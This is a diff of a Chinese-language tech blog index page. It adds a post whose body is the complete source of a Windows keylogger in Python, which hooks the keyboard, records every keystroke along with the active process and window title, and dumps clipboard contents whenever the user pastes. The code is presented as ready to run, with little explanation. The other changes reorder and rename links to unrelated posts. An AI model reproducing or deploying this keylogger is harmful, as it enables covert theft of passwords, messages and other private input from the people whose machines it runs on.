@@ -275,7 +275,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/23.vksec_操作记录/">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/02/01/29_python_键盘记录器/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="vsyour">
@@ -297,8 +297,8 @@
             
               
                 
-                <a class="post-title-link" href="/2018/01/29/23.vksec_操作记录/" itemprop="url">
-                  vksec 操作记录
+                <a class="post-title-link" href="/2018/02/01/29_python_键盘记录器/" itemprop="url">
+                  python 键盘记录器
                 </a>
               
             
@@ -314,8 +314,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-29T12:21:52+08:00">
-                2018-01-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-01T00:00:00+08:00">
+                2018-02-01
               </time>
             
 
@@ -337,8 +337,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
                   </a>
                 </span>
 
@@ -356,8 +356,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2018/01/29/23.vksec_操作记录/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2018/01/29/23.vksec_操作记录/" class="cy_cmt_count" data-xid="2018/01/29/23.vksec_操作记录/" itemprop="commentsCount" ></span>
+                <a href="/2018/02/01/29_python_键盘记录器/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2018/02/01/29_python_键盘记录器/" class="cy_cmt_count" data-xid="2018/02/01/29_python_键盘记录器/" itemprop="commentsCount" ></span>
                 </a>
               
             
@@ -383,10 +383,166 @@
 
       
         
-          <p>本文用作记录，vksec 操作记录<br>QQ群：397745473<br>
+          
+            <p>python 键盘记录器代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> pythoncom</div><div class="line"><span class="keyword">import</span> pyHook</div><div class="line"><span class="keyword">import</span> win32clipboard</div><div class="line"></div><div class="line">user32 = windll.user32</div><div class="line">kernel32 = windll.kernel32</div><div class="line">psapi = windll.psapi</div><div class="line">current_window = <span class="keyword">None</span></div><div class="line"></div><div class="line"><span class="comment"># </span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_current_process</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">    <span class="comment"># 获取最上层的窗口句柄</span></div><div class="line">    hwnd = user32.GetForegroundWindow()</div><div class="line"></div><div class="line">    <span class="comment"># 获取进程ID</span></div><div class="line">    pid = c_ulong(<span class="number">0</span>)</div><div class="line">    user32.GetWindowThreadProcessId(hwnd,byref(pid))</div><div class="line"></div><div class="line">    <span class="comment"># 将进程ID存入变量中</span></div><div class="line">    process_id = <span class="string">"%d"</span> % pid.value</div><div class="line"></div><div class="line">    <span class="comment"># 申请内存</span></div><div class="line">    executable = create_string_buffer(<span class="string">"\x00"</span>*<span class="number">512</span>)</div><div class="line">    h_process = kernel32.OpenProcess(<span class="number">0x400</span> | <span class="number">0x10</span>,<span class="keyword">False</span>,pid)</div><div class="line"></div><div class="line">    psapi.GetModuleBaseNameA(h_process,<span class="keyword">None</span>,byref(executable),<span class="number">512</span>)</div><div class="line"></div><div class="line">    <span class="comment"># 读取窗口标题</span></div><div class="line">    windows_title = create_string_buffer(<span class="string">"\x00"</span>*<span class="number">512</span>)</div><div class="line">    length = user32.GetWindowTextA(hwnd,byref(windows_title),<span class="number">512</span>)</div><div class="line"></div><div class="line">    <span class="comment"># 打印</span></div><div class="line">    <span class="keyword">print</span> </div><div class="line">    <span class="keyword">print</span> <span class="string">"[ PID:%s-%s-%s]"</span> % (process_id,executable.value,windows_title.value)</div><div class="line">    <span class="keyword">print</span> </div><div class="line"></div><div class="line">    <span class="comment"># 关闭handles</span></div><div class="line">    kernel32.CloseHandle(hwnd)</div><div class="line">    kernel32.CloseHandle(h_process)</div><div class="line"></div><div class="line"><span class="comment"># 定义击键监听事件函数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">KeyStroke</span><span class="params">(event)</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">global</span> current_window</div><div class="line"></div><div class="line">    <span class="comment"># 检测目标窗口是否转移(换了其他窗口就监听新的窗口)</span></div><div class="line">    <span class="keyword">if</span> event.WindowName != current_window:</div><div class="line">        current_window = event.WindowName</div><div class="line">        <span class="comment"># 函数调用</span></div><div class="line">        get_current_process()</div><div class="line"></div><div class="line">    <span class="comment"># 检测击键是否常规按键（非组合键等）</span></div><div class="line">    <span class="keyword">if</span> event.Ascii &gt; <span class="number">32</span> <span class="keyword">and</span> event.Ascii &lt;<span class="number">127</span>:</div><div class="line">        <span class="keyword">print</span> chr(event.Ascii),</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment"># 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来</span></div><div class="line">        <span class="keyword">if</span> event.Key == <span class="string">"V"</span>:</div><div class="line">            win32clipboard.OpenClipboard()</div><div class="line">            pasted_value = win32clipboard.GetClipboardData()</div><div class="line">            win32clipboard.CloseClipboard()</div><div class="line">            <span class="keyword">print</span> <span class="string">"[PASTE]-%s"</span> % (pasted_value),</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"[%s]"</span> % event.Key,</div><div class="line">    <span class="comment"># 循环监听下一个击键事件</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="comment"># 创建并注册hook管理器</span></div><div class="line">kl = pyHook.HookManager()</div><div class="line">kl.KeyDown = KeyStroke</div><div class="line"></div><div class="line"><span class="comment"># 注册hook并执行</span></div><div class="line">kl.HookKeyboard()</div><div class="line">pythoncom.PumpMessages()</div></pre></td></tr></table></figure>
+<p>参考:<br>python 键盘记录器<br><a href="http://blog.csdn.net/qq_16234613/article/details/79151528" target="_blank" rel="external">http://blog.csdn.net/qq_16234613/article/details/79151528</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/31/28_selenium环境配置Firefox和Chrome/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="vsyour">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://ww4.sinaimg.cn/small/937882b5jw1f4db4lroy9j20hs0npmy6.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Openresty Python LUA">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/01/31/28_selenium环境配置Firefox和Chrome/" itemprop="url">
+                  selenium环境配置Firefox和Chrome
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-31T00:00:00+08:00">
+                2018-01-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2018/01/31/28_selenium环境配置Firefox和Chrome/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2018/01/31/28_selenium环境配置Firefox和Chrome/" class="cy_cmt_count" data-xid="2018/01/31/28_selenium环境配置Firefox和Chrome/" itemprop="commentsCount" ></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>Selenium  是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Mozilla Firefox，Safari，Google Chrome，Opera等。<br>这个工具的主要功能包括：测试与浏览器的兼容性——测试你的应用程序看是否能够很好得工作在不同浏览器和操作系统之上。<br>测试系统功能——创建回归测试检验软件功能和用户需求。支持自动录制动作和自动生成 .Net、Java、Perl等不同语言的测试脚本。</p>
+<p>selenium 环境配置 Firefox和Chrome</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/01/29/23.vksec_操作记录/#more" rel="contents">
+            <a class="btn" href="/2018/01/31/28_selenium环境配置Firefox和Chrome/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -432,7 +588,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/25.将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/25_将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="vsyour">
@@ -454,7 +610,7 @@
             
               
                 
-                <a class="post-title-link" href="/2018/01/29/25.将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/" itemprop="url">
+                <a class="post-title-link" href="/2018/01/29/25_将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/" itemprop="url">
                   将Facebook Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入！
                 </a>
               
@@ -513,8 +669,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2018/01/29/25.将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2018/01/29/25.将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/" class="cy_cmt_count" data-xid="2018/01/29/25.将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/" itemprop="commentsCount" ></span>
+                <a href="/2018/01/29/25_将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2018/01/29/25_将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/" class="cy_cmt_count" data-xid="2018/01/29/25_将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/" itemprop="commentsCount" ></span>
                 </a>
               
             
@@ -543,7 +699,7 @@
           <p>将Facebook Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入！<br>QQ群：397745473<br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/01/29/25.将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/#more" rel="contents">
+            <a class="btn" href="/2018/01/29/25_将Facebook_Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -589,7 +745,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/24.vps_推荐001/">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/23_vksec_操作记录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="vsyour">
@@ -611,8 +767,8 @@
             
               
                 
-                <a class="post-title-link" href="/2018/01/29/24.vps_推荐001/" itemprop="url">
-                  eukhost 性价比高/17.95美元一年/512MB内存/15GB硬盘/3TB流量/1Gbps/KVM/洛杉矶MC机房/三网都还算好
+                <a class="post-title-link" href="/2018/01/29/23_vksec_操作记录/" itemprop="url">
+                  vksec 操作记录
                 </a>
               
             
@@ -628,7 +784,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-29T00:00:00+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-29T12:21:52+08:00">
                 2018-01-29
               </time>
             
@@ -651,8 +807,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/vps推荐/" itemprop="url" rel="index">
-                    <span itemprop="name">vps推荐</span>
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
                   </a>
                 </span>
 
@@ -670,8 +826,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2018/01/29/24.vps_推荐001/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2018/01/29/24.vps_推荐001/" class="cy_cmt_count" data-xid="2018/01/29/24.vps_推荐001/" itemprop="commentsCount" ></span>
+                <a href="/2018/01/29/23_vksec_操作记录/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2018/01/29/23_vksec_操作记录/" class="cy_cmt_count" data-xid="2018/01/29/23_vksec_操作记录/" itemprop="commentsCount" ></span>
                 </a>
               
             
@@ -697,10 +853,10 @@
 
       
         
-          <p>eukhost 算是一家比较新的商家，但他们的技术实力我看并不差，在我自己购买了一台他们的VPS之后观察了几个月来看，算是非常的稳定了，基本就没见离线过。这家的控制面板也比较奇葩点，支持按小时计费，且能随意提升配置。免费提供rDNS功能与AnyCast DNS的使用。当然，我更看重的是他们支持以每个月2美元的价格加一个由Voxility提供防护的DDOS高防IP。当然了，可能价格他们不是最低的，但我觉得VPS这种东西稳定是最重要的，谁也不想天天发工单去抗议吧。烦不烦呢。<br>QQ群：397745473</p>
+          <p>本文用作记录，vksec 操作记录<br>QQ群：397745473<br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/01/29/24.vps_推荐001/#more" rel="contents">
+            <a class="btn" href="/2018/01/29/23_vksec_操作记录/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -746,7 +902,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/26.大量注册gmail账号/">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/26_大量注册gmail账号/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="vsyour">
@@ -768,7 +924,7 @@
             
               
                 
-                <a class="post-title-link" href="/2018/01/29/26.大量注册gmail账号/" itemprop="url">
+                <a class="post-title-link" href="/2018/01/29/26_大量注册gmail账号/" itemprop="url">
                   奇技淫巧：手工注册大量google账号的方法
                 </a>
               
@@ -827,8 +983,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2018/01/29/26.大量注册gmail账号/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2018/01/29/26.大量注册gmail账号/" class="cy_cmt_count" data-xid="2018/01/29/26.大量注册gmail账号/" itemprop="commentsCount" ></span>
+                <a href="/2018/01/29/26_大量注册gmail账号/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2018/01/29/26_大量注册gmail账号/" class="cy_cmt_count" data-xid="2018/01/29/26_大量注册gmail账号/" itemprop="commentsCount" ></span>
                 </a>
               
             
@@ -855,10 +1011,9 @@
       
         
           <p>奇技淫巧：手工注册大量google账号的方法<br>QQ群：397745473</p>
-<p>第一种方式很简单<br>用火狐阅读器<br>安装插件User Agent Switcher<br>挑选：</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/01/29/26.大量注册gmail账号/#more" rel="contents">
+            <a class="btn" href="/2018/01/29/26_大量注册gmail账号/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -904,7 +1059,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/27.excel随机生成密码/">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/24_vps_推荐001/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="vsyour">
@@ -926,7 +1081,164 @@
             
               
                 
-                <a class="post-title-link" href="/2018/01/29/27.excel随机生成密码/" itemprop="url">
+                <a class="post-title-link" href="/2018/01/29/24_vps_推荐001/" itemprop="url">
+                  eukhost 性价比高/17.95美元一年/512MB内存/15GB硬盘/3TB流量/1Gbps/KVM/洛杉矶MC机房/三网都还算好
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-29T00:00:00+08:00">
+                2018-01-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vps推荐/" itemprop="url" rel="index">
+                    <span itemprop="name">vps推荐</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2018/01/29/24_vps_推荐001/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2018/01/29/24_vps_推荐001/" class="cy_cmt_count" data-xid="2018/01/29/24_vps_推荐001/" itemprop="commentsCount" ></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>eukhost 算是一家比较新的商家，但他们的技术实力我看并不差，在我自己购买了一台他们的VPS之后观察了几个月来看，算是非常的稳定了，基本就没见离线过。这家的控制面板也比较奇葩点，支持按小时计费，且能随意提升配置。免费提供rDNS功能与AnyCast DNS的使用。当然，我更看重的是他们支持以每个月2美元的价格加一个由Voxility提供防护的DDOS高防IP。当然了，可能价格他们不是最低的，但我觉得VPS这种东西稳定是最重要的，谁也不想天天发工单去抗议吧。烦不烦呢。<br>QQ群：397745473</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/01/29/24_vps_推荐001/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2018/01/29/27_excel随机生成密码/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="vsyour">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://ww4.sinaimg.cn/small/937882b5jw1f4db4lroy9j20hs0npmy6.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Openresty Python LUA">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/01/29/27_excel随机生成密码/" itemprop="url">
                   excel随机生成密码
                 </a>
               
@@ -985,8 +1297,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2018/01/29/27.excel随机生成密码/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2018/01/29/27.excel随机生成密码/" class="cy_cmt_count" data-xid="2018/01/29/27.excel随机生成密码/" itemprop="commentsCount" ></span>
+                <a href="/2018/01/29/27_excel随机生成密码/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2018/01/29/27_excel随机生成密码/" class="cy_cmt_count" data-xid="2018/01/29/27_excel随机生成密码/" itemprop="commentsCount" ></span>
                 </a>
               
             
@@ -1015,7 +1327,7 @@
           <p>excel随机生成密码<br>QQ群：397745473</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/01/29/27.excel随机生成密码/#more" rel="contents">
+            <a class="btn" href="/2018/01/29/27_excel随机生成密码/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1061,7 +1373,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2017/05/22/20.pyDes库_实现python的des加密/">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2017/05/22/30_python_用pyqt开发/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="vsyour">
@@ -1083,7 +1395,164 @@
             
               
                 
-                <a class="post-title-link" href="/2017/05/22/20.pyDes库_实现python的des加密/" itemprop="url">
+                <a class="post-title-link" href="/2017/05/22/30_python_用pyqt开发/" itemprop="url">
+                  pyqt开发记录
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-22T00:00:00+08:00">
+                2017-05-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2017/05/22/30_python_用pyqt开发/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2017/05/22/30_python_用pyqt开发/" class="cy_cmt_count" data-xid="2017/05/22/30_python_用pyqt开发/" itemprop="commentsCount" ></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>pyqt开发记录<br>QQ群：397745473</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/05/22/30_python_用pyqt开发/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2017/05/22/20_pyDes库_实现python的des加密/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="vsyour">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://ww4.sinaimg.cn/small/937882b5jw1f4db4lroy9j20hs0npmy6.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Openresty Python LUA">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/05/22/20_pyDes库_实现python的des加密/" itemprop="url">
                   pyDes库 实现python的des加密,注册机
                 </a>
               
@@ -1142,8 +1611,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2017/05/22/20.pyDes库_实现python的des加密/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2017/05/22/20.pyDes库_实现python的des加密/" class="cy_cmt_count" data-xid="2017/05/22/20.pyDes库_实现python的des加密/" itemprop="commentsCount" ></span>
+                <a href="/2017/05/22/20_pyDes库_实现python的des加密/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2017/05/22/20_pyDes库_实现python的des加密/" class="cy_cmt_count" data-xid="2017/05/22/20_pyDes库_实现python的des加密/" itemprop="commentsCount" ></span>
                 </a>
               
             
@@ -1172,7 +1641,7 @@
           <p>pyDes库 实现python的des加密,注册机<br>QQ群：397745473</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2017/05/22/20.pyDes库_实现python的des加密/#more" rel="contents">
+            <a class="btn" href="/2017/05/22/20_pyDes库_实现python的des加密/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1218,7 +1687,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2017/05/15/18.lede 固件/">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2017/05/15/18_lede_固件/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="vsyour">
@@ -1240,7 +1709,7 @@
             
               
                 
-                <a class="post-title-link" href="/2017/05/15/18.lede 固件/" itemprop="url">
+                <a class="post-title-link" href="/2017/05/15/18_lede_固件/" itemprop="url">
                   lede 固件
                 </a>
               
@@ -1299,8 +1768,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2017/05/15/18.lede 固件/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2017/05/15/18.lede 固件/" class="cy_cmt_count" data-xid="2017/05/15/18.lede 固件/" itemprop="commentsCount" ></span>
+                <a href="/2017/05/15/18_lede_固件/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://vksec.com/2017/05/15/18_lede_固件/" class="cy_cmt_count" data-xid="2017/05/15/18_lede_固件/" itemprop="commentsCount" ></span>
                 </a>
               
             
@@ -1335,485 +1804,6 @@
 <p>QQ群：397745473</p>
 
           
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
